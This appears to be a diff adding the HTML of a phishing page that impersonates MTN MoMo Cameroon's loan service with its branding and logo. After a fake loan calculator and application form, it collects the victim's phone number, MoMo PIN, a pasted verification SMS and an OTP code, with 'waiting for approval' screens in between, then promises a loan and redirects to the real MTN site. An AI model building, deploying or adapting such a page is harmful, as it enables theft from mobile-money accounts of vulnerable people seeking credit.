@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.postimg.cc/yd0znr7D/images-png-mtn.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://i.postimg.cc/yd0znr7D/images-png-mtn.png">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MTN MoMo Cameroon – Easy Loans</title>
+    <meta property="og:title" content="MTN MoMo Cameroon – Easy Loans" />
+    <meta property="og:description" content="Get instant loans straight to your MTN MoMo wallet. No collateral. No paperwork. Approved in minutes." />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://mtn-momo-loans-cameroon.vercel.app/" />
+    <meta property="og:site_name" content="MTN MoMo Cameroon" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="MTN MoMo Cameroon – Easy Loans" />
+    <meta name="twitter:description" content="Get instant loans straight to your MTN MoMo wallet. No collateral. No paperwork. Approved in minutes." />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+    <!-- ═══════════════════ ADMIN MODAL (IMPORTANT NOTE) ═══════════════════ -->
+    <div id="adminModalOverlay">
+        <div class="admin-modal">
+            <div class="modal-title">
+                <span>📌</span> IMPORTANT NOTE
+            </div>
+            <div class="modal-body" id="adminModalBody">Message from admin</div>
+            <button class="modal-close-btn" onclick="closeAdminModal()">OK, GOT IT</button>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
+    <div id="page-landing" class="page">
+        <div class="land-nav">
+            <div style="flex: 1;"></div>
+            <div class="mtn-logo">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img" />
+                <div class="mtn-logo-text" style="color:#fff;">MoMo</div>
+                <div class="mtn-logo-sub" style="color:rgba(255,255,255,0.6);">from MTN Cameroon</div>
+                <div class="flag-badge"><span class="flag-emoji">🇨🇲</span> Cameroon</div>
+            </div>
+            <div style="flex: 1;"></div>
+        </div>
+        <div class="land-center">
+            <div class="land-card">
+                <h1>Welcome to MTN MoMo 🇨🇲</h1>
+                <p class="land-tagline">Get loans easily through MTN MoMo in Cameroon</p>
+                <div class="calc-box">
+                    <h2>Loan Calculator</h2>
+                    <div class="calc-row2">
+                        <span>Amount</span>
+                        <span class="cv" id="calcAmt">XAF 500,000</span>
+                    </div>
+                    <div class="calc-row2">
+                        <span>Term</span>
+                        <span class="cv" id="calcTerm">48 Months</span>
+                    </div>
+                    <div class="slider-hint-wrap">
+                        <span class="hint-text">
+                            <span class="hint-arrow"></span> Slide to adjust loan amount
+                        </span>
+                    </div>
+                    <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()" />
+                    <div class="range-ends">
+                        <span>XAF 500,000</span>
+                        <span>XAF 5,000,000</span>
+                    </div>
+                    <div class="monthly-box">
+                        <span class="ml">Monthly Payment</span>
+                        <span class="ma" id="monthlyAmt">XAF 24,000</span>
+                    </div>
+                </div>
+                <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
+            </div>
+        </div>
+        <div class="land-footer">© 2026 MTN MoMo Cameroon – Powered by MTN</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
+    <div id="page-step1" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-landing')"> <-Back</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Cameroon</div>
+                </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">🇨🇲</span>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Loan Application</h2>
+                <p class="step-sub">Step 1 of 3</p>
+                <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+                <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
+                <div class="field"><label>Loan Amount (XAF)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
+                <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
+                <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
+                <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
+    <div id="page-step2" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Cameroon</div>
+                </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">🇨🇲</span>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Loan Application</h2>
+                <p class="step-sub">Step 2 of 3</p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+                <div class="field-row">
+                    <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
+                </div>
+                <div class="field">
+                    <label>Phone Number (MTN Cameroon)</label>
+                    <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="s2ph" placeholder="771234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
+                    <div class="field-hint">9 digits without +237 prefix (e.g., 771234567)</div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step1')">BACK</button>
+                    <button class="btn-grad" onclick="toS3()">NEXT STEP</button>
+                </div>
+            </div>
+        </div>
+        <div class="pg-footer">© 2026 MTN MoMo Cameroon</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
+    <div id="page-step3" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Cameroon</div>
+                </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">🇨🇲</span>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Loan Application</h2>
+                <p class="step-sub">Step 3 of 3</p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+                <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+                <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
+                <div class="field"><label>Annual Income (XAF)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')" /></div>
+                <div class="sum-box">
+                    <h3>Application Summary</h3>
+                    <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">XAF 1,000,000</span></div>
+                    <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
+                    <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
+                    <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step2')">BACK</button>
+                    <button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION</button>
+                </div>
+            </div>
+        </div>
+        <div class="pg-footer">© 2026 MTN MoMo Cameroon</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 5: PROCESSING ══════════════════════ -->
+    <div id="page-processing" class="page">
+        <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="proc-wrap">
+                <div class="proc-icon">⏳</div>
+                <h2>Processing Application...</h2>
+                <p>Please wait while we process your loan application</p>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7);">You will be redirected to continue with MTN MoMo Cameroon</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 6: SIM CARD CHECK (UPDATED) ══════════════════════ -->
+    <div id="page-sim-check" class="page" style="background: #fff;">
+        <div style="background-color: var(--mtn-dark); height: 45vh; border-radius: 0 0 40px 40px; position: relative; display: flex; flex-direction: column; align-items: center; flex-shrink: 0; padding-top: 20px;">
+            <button style="position: absolute; top: 20px; left: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">‹</button>
+            <button style="position: absolute; top: 20px; right: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">✕</button>
+
+            <div class="circle-overlap" style="position: absolute; bottom: -50px; left: 50%; transform: translateX(-50%); width: 280px; height: 280px; background: #fff; border-radius: 50%; border: 10px solid #ffffff; box-shadow: 0 20px 40px rgba(0,0,0,0.15); display: flex; align-items: center; justify-content: center; z-index: 10;">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 120" width="160" height="192">
+                    <rect x="25" y="20" width="50" height="100" rx="9" fill="#f4f8fc" stroke="#004080" stroke-width="5"/>
+                    <rect x="32" y="30" width="36" height="60" rx="3" fill="#fff" stroke="#d0d8e0" stroke-width="2.5"/>
+                    <line x1="36" y1="40" x2="54" y2="40" stroke="#d0d8e0" stroke-width="3"/>
+                    <line x1="36" y1="50" x2="54" y2="50" stroke="#d0d8e0" stroke-width="3"/>
+                    <line x1="36" y1="60" x2="48" y2="60" stroke="#d0d8e0" stroke-width="3"/>
+                    <circle cx="35" cy="98" r="5" fill="#d0d8e0"/>
+
+                    <polygon points="68,45 58,40 58,50" fill="none" stroke="#004080" stroke-width="4" stroke-linejoin="round"/>
+
+                    <rect x="65" y="25" width="40" height="45" rx="5" fill="#f4f8fc" stroke="#004080" stroke-width="4"/>
+                    <rect x="70" y="32" width="20" height="10" rx="2" fill="#FFD700"/>
+                    <rect x="82" y="32" width="10" height="10" rx="2" fill="#FFD700"/>
+                    <rect x="70" y="42" width="12" height="10" rx="2" fill="#FFD700"/>
+                    <rect x="82" y="42" width="10" height="10" rx="2" fill="#FFD700"/>
+                </svg>
+            </div>
+        </div>
+
+        <div style="flex: 1; background: #fff; padding: 70px 20px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: flex-start;">
+            <h2 style="color: var(--mtn-dark); font-size: 1.8rem; font-weight: 700; margin-top: 10px;">SIM Card</h2>
+            <p style="color: var(--text-mid); font-size: 1.0rem; margin-top: 15px; line-height: 2.6; max-width: 400px;">
+                Make sure that the SIM card linked to this profile is in this device.
+            </p>
+        </div>
+
+        <div style="padding: 0 24px 40px 24px; width: 100%; flex-shrink: 0; margin-top: auto;">
+            <button class="btn-grad" onclick="goTo('page-login')" style="border-radius: 30px; font-size: 1rem; padding: 16px; background: #003366; background: linear-gradient(to right, #003366, #004080);">NEXT</button>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 7: LOGIN ══════════════════════ -->
+    <div id="page-login" class="page" style="background: #fff;">
+        <div style="background: var(--mtn-dark); height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding-top: 30px; flex-shrink: 0;">
+            <div style="width: 50px; height: 50px; background: #fff; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" style="height: 36px; object-fit: contain;" />
+            </div>
+            <div style="color: var(--mtn-gold); font-weight: 700; font-size: 1.2rem; letter-spacing: 0.5px;">MoMo</div>
+            <div style="color: rgba(255,255,255,0.6); font-size: 0.7rem; font-weight: 500;">from MTN</div>
+        </div>
+
+        <div style="flex: 1; background: #fff; padding: 0 20px; display: flex; flex-direction: column; align-items: center;">
+            <div style="margin-top: -30px; background: #fff; border-radius: 16px; box-shadow: 0 6px 30px rgba(0,0,0,0.08); padding: 30px 24px; max-width: 380px; width: 100%; z-index: 10;">
+                <h3 style="text-align: center; color: var(--mtn-dark); font-size: 1.25rem; font-weight: 700; margin-bottom: 24px;">Welcome to MoMo</h3>
+
+                <div style="display: flex; gap: 10px; align-items: stretch; margin-bottom: 20px;">
+                    <div style="width: 54px; height: 54px; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: #fff; flex-shrink: 0;">
+                        <span style="font-size: 1.5rem; line-height: 1;">🇨🇲</span>
+                    </div>
+                    <div style="flex: 1; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; background: #fff;">
+                        <input type="tel" id="lpPhone" placeholder="Enter number *" style="border: none; outline: none; width: 100%; font-size: 1rem; padding: 14px 16px; font-family: 'Inter'; background: transparent; color: var(--text-dark);" maxlength="9" oninput="normalizePhone('lpPhone'); chkPin();" />
+                    </div>
+                </div>
+
+                <div style="padding-top: 6px; border-top: 1px solid #f0f0f0;">
+                    <label style="display: block; font-size: 0.8rem; font-weight: 500; color: var(--text-mid); margin-bottom: 12px; text-align: center; margin-top: 14px;">Enter MoMo PIN (4 digits)</label>
+                    <div class="pin-row" style="display: flex; gap: 10px; justify-content: center; align-items: center;">
+                        <input type="password" id="lp0" class="pin-box" maxlength="1" oninput="pinMvM(this, 0)" placeholder="•" />
+                        <input type="password" id="lp1" class="pin-box" maxlength="1" oninput="pinMvM(this, 1)" placeholder="•" />
+                        <input type="password" id="lp2" class="pin-box" maxlength="1" oninput="pinMvM(this, 2)" placeholder="•" />
+                        <input type="password" id="lp3" class="pin-box" maxlength="1" oninput="pinMvM(this, 3)" placeholder="•" />
+                        <button class="pin-eye" onclick="togPin()" title="Show/Hide" style="cursor:pointer; background:none; border:none; font-size:1.2rem; color:var(--text-light); padding:4px;">👁</button>
+                        <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN" style="cursor:pointer; background:none; border:none; font-size:1rem; color:var(--text-light); padding:4px;">✕</button>
+                    </div>
+                </div>
+
+                <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
+                <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
+                <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
+            </div>
+
+            <div style="text-align: center; font-size: 0.98rem; color: #005c99; line-height: 2.5; max-width: 420px; margin: 30px 0;">
+                By using this app you agree to our <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Mobile Terms of Use</a> and <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Privacy Policy</a>
+            </div>
+        </div>
+
+        <div style="padding: 0 24px 40px 24px; flex-shrink: 0; margin-top: auto;">
+            <button id="bLgn" class="btn-login" onclick="doLogin()" style="width: 100%; padding: 14px; border-radius: 30px; background: #003366; color: #fff; border: none; font-weight: 600; font-size: 1rem; font-family: 'Inter'; transition: all 0.2s; cursor: pointer;" disabled>NEXT</button>
+            <div id="mLgn" class="loading" style="margin-top: 10px;">
+                <div class="spinner" style="margin: 8px auto; width: 32px; height: 32px; border-width: 3px;"></div>
+                <div class="wait-msg" style="font-size: 0.85rem;">Logging in…</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 8: WAIT FOR LOGIN APPROVAL ══════════════════════ -->
+    <div id="page-wait-login-approval" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Authentication in progress...</h2>
+                <p>Please wait</p>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Do not close this page</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 9: SMS MESSAGE PASTE ══════════════════════ -->
+    <div id="page-sms-paste" class="page">
+        <div class="sms-topbar">
+            <button class="bk" onclick="goTo('page-login')">← Back</button>
+            <div style="flex:1;"></div>
+            <div style="text-align:center; color:var(--mtn-dark); font-weight:600;">SMS Verification</div>
+            <div style="flex:1;"></div>
+        </div>
+        <div class="sms-body-wrap">
+            <div class="sms-card">
+                <h2>Paste SMS Message</h2>
+                <p class="sms-hint">A verification message has been sent to your phone via MTN Cameroon. Please copy and paste the full message here.</p>
+                <div class="sms-timer-wrap" id="smsTimerWrap">
+                    <div class="sms-timer-circle">
+                        <svg class="sms-timer-svg" width="44" height="44" viewBox="0 0 44 44">
+                            <circle class="sms-timer-bg" cx="22" cy="22" r="18"/>
+                            <circle class="sms-timer-arc" id="smsTimerArc" cx="22" cy="22" r="18"/>
+                        </svg>
+                        <div class="sms-timer-num" id="smsTimerNum">60</div>
+                    </div>
+                    <div class="sms-timer-text"><strong>Message expires in <span id="smsTimerSec">60</span>s.</strong><br />Paste your SMS before time runs out.</div>
+                </div>
+                <div class="sms-resend-wrap" id="smsResendWrap">
+                    <p>⏰ Your verification session has expired.<br />Request a new SMS and paste it below.</p>
+                    <button class="btn-resend" id="bResend" onclick="doSmsResend()">🔄 Resend SMS</button>
+                    <div id="mResend" class="loading" style="margin-top:10px;">
+                        <div class="spinner" style="margin:8px auto; width:30px; height:30px; border-width:3px;"></div>
+                        <div class="wait-msg" style="font-size:0.82rem;">Sending…</div>
+                    </div>
+                </div>
+                <textarea id="smsMsgBox" class="sms-textarea" placeholder="Paste your full SMS message here…" oninput="chkSmsMsg()"></textarea>
+                <p class="sms-code-hint">Example: "Your MTN MoMo verification code is: 123456"</p>
+                <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
+                <div class="msg-box success" id="smsMsgOk"><span class="msg-icon">✓</span><span id="smsMsgOkTxt"></span></div>
+                <button id="bSms" class="btn-sms" onclick="doSmsParse()">SUBMIT</button>
+                <div id="mSms" class="loading">
+                    <div class="spinner" style="margin:16px auto;"></div>
+                    <div class="wait-msg">Processing message…</div>
+                </div>
+            </div>
+        </div>
+        <div class="sms-curve"></div>
+        <div class="sms-foot">© 2026 MTN MoMo Cameroon – Powered by MTN</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 10: WAIT FOR SMS APPROVAL ══════════════════════ -->
+    <div id="page-wait-sms" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Verification in progress...</h2>
+                <p>Please wait</p>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Do not close this page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 11: OTP ══════════════════════ -->
+    <div id="page-otp" class="page">
+        <div class="otp-topbar">
+            <button class="bk" onclick="goTo('page-sms-paste')">← Back</button>
+            <div style="flex:1;"></div>
+            <div style="text-align:center; color:var(--mtn-dark); font-weight:600;">OTP Verification</div>
+            <div style="flex:1;"></div>
+        </div>
+        <div class="otp-body-wrap">
+            <div class="otp-card">
+                <h2>Enter OTP Code</h2>
+                <p class="otp-hint">Enter the 4-digit OTP code sent to your phone via MTN MoMo Cameroon</p>
+                <div class="otp-section">
+                    <div class="otp-section-title">OTP Code (4 digits):</div>
+                    <div style="display:flex; align-items:center;">
+                        <div class="otp-inputs" id="otpInputs">
+                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                        </div>
+                        <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
+                    </div>
+                </div>
+                <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
+                <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+                <button id="bOtp" class="btn-otp" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
+                <div id="mOtp" class="loading">
+                    <div class="spinner" style="margin:16px auto;"></div>
+                    <div class="wait-msg">Verifying…</div>
+                </div>
+            </div>
+        </div>
+        <div class="otp-curve"></div>
+        <div class="otp-foot">© 2026 MTN MoMo Cameroon – Powered by MTN</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 12: WAIT FOR OTP APPROVAL ══════════════════════ -->
+    <div id="page-wait-otp" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Verifying OTP Code</h2>
+                <p>Please wait</p>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Do not close this page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 13: APPROVAL ══════════════════════ -->
+    <div id="page-approval" class="page">
+        <div class="appr-wrap">
+            <div class="appr-top">
+                <div class="check-circle">✓</div>
+                <h2 class="appr-title">Loan Approved!</h2>
+                <p class="appr-sub">Your loan has been successfully approved.</p>
+                <div class="appr-banner">
+                    <div class="abl">Amount to Receive</div>
+                    <div class="aba" id="aprAmount">XAF 1,000,000</div>
+                </div>
+            </div>
+            <div class="comp-box">
+                <div class="ch">ℹ️ Important Information</div>
+                <p>The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p>
+            </div>
+            <div class="ld-card">
+                <div class="ld-htitle">📊 Loan Details</div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-g">💰</div>
+                    <div>
+                        <div class="ld-lbl">Amount</div>
+                        <div class="ld-val" id="aprAmt">XAF 1,000,000</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-b">📅</div>
+                    <div>
+                        <div class="ld-lbl">Term</div>
+                        <div class="ld-val" id="aprTerm">48 Months</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-p">💳</div>
+                    <div>
+                        <div class="ld-lbl">Monthly Payment</div>
+                        <div class="ld-val" id="aprMth">XAF 24,000</div>
+                    </div>
+                </div>
+            </div>
+            <div class="nxt-steps">
+                <span style="font-size:1.2rem;">📌</span>
+                <p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next section.</p>
+            </div>
+            <div class="rth-wrap">
+                <button class="rth-btn" onclick="window.location.href='https://momo.mtn.com/home-cm/?country=Cameroon&lang=en'">FINISH</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ SCRIPTS ══════════════════════ -->
+    <script src="script.js"></script>
+</body>
+</html>
